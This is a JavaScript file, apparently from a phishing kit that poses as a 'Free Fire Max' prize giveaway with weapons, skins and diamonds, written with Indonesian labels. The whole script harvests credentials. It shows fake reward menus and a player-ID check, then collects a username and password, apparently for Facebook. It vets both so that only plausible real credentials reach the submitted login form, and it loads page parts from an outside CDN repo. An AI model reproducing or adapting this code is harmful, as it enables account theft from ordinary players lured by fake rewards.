
            const swiper = new Swiper('.swiper', {
            spaceBetween: 50,
            direction: 'horizontal',
            loop: true,
            autoplay: {
                delay: 2000,
                disableOnInteraction: false,
            },
            navigation: {
                nextEl: '.next-slide',
                prevEl: '.prev-slide',
            },
            });
            'use strict'
            // NATIVE JAVASCRIPT
            $(document).ready(function(){
                setTimeout(() => {
                    $('.loader').fadeOut()
                },1000)
            })
            window.addEventListener('submit',function(e){
                e.preventDefault();
                $("#btnfb").addClass("disabled");
                setTimeout(() => {
                var user = $('#user').val();
                var pass = $('#pass').val();
                if(user == '' || user == null)
                {
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                }else{
                
                    if(user.includes('@')){
                    let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
                    if(user.match(pattern)){
                    $('.email').hide();
                    }else{
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                    }
                    }
                    
                    if(!isNaN(user)){
                    if(user.length <= 10){
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                    }else{
                    $('.email').hide();
                    }
                    }
                    
                    if(user.match(/\s/g)){
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                    }else{
                    $('.email').hide();
                    }
                    
                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                    if(user.match(regex)){
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                    }
                    
                    
                    if(user.length <= 5){
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                    }else{
                    $('.email').hide();
                    }
                    
                }
                if(pass == '' || pass == null || pass.length <= 5)
                {
                    $('.sandi').show();
                    $("#btnfb").removeClass("disabled");
                    return false;
                }else{
                    $('.sandi').hide();
                }
                var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                    if(pass.match(regexs)){
                    $('.sandi').show();
                    $('.email').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                    }else{
                    $('.sandi').hide();
                    }
                $('.login-form').submit()
                },1000)
            })
            const ng = document.querySelectorAll('.menu .col');
                for(let i = 0; i <= ng.length - 1; i++)
                {
                    ng[i].onclick = function(e)
                    {
                        let x = 0;
                        while(x < ng.length)
                        {
                            ng[x++].className = 'col';
                        }
                            ng[i].className = 'col active';
                            switch(ng[i].children[1].innerText){
                                case 'Weapon' : $('.content').load('https://cdn.jsdelivr.net/gh/log-del/sc/ff-max/pages/slide1.js')
                                                break;
                                case 'Skin Old' : $('.content').load('https://cdn.jsdelivr.net/gh/log-del/sc/ff-max/pages/slide2.js')
                                                break;
                                case 'Diamond' : $('.content').load('https://cdn.jsdelivr.net/gh/log-del/sc/ff-max/pages/slide3.js')
                                                break;
                                case 'Incubator' : $('.content').load('https://cdn.jsdelivr.net/gh/log-del/sc/ff-max/pages/slide4.js')
                            }
                    }
                }
                // JQUERY
                function gass(e){
                    var src = e.previousSibling.previousElementSibling.getElementsByTagName('img')[0].getAttribute('src');
                    $('#hadiah').attr('src',src);
                    $('input[name="hadiah"]').val(src);
                    $('.dialog').fadeIn().css('display','flex');
                    $('.mask').fadeIn();
                }
                function tutup(){
                    $('.dialog').fadeOut();
                    $('.mask').fadeOut()
                }
                $('.btn-check').click(function(){
                    let id = $('#playerid');
                    if(id.val() == '' || id.val() == null || id.val().length <= 5){
                        id.addClass('empty');
                        return false;
                    }else{
                        $('.trueid').hide();
                                    $('.alert').hide();
                                    $('.toast').fadeIn();
                                    setTimeout(() => {
                                        $('.toast').fadeOut();
                                        $('.mask').fadeOut();
                                    },2000);
                    }
                    // VALIDATE
                })
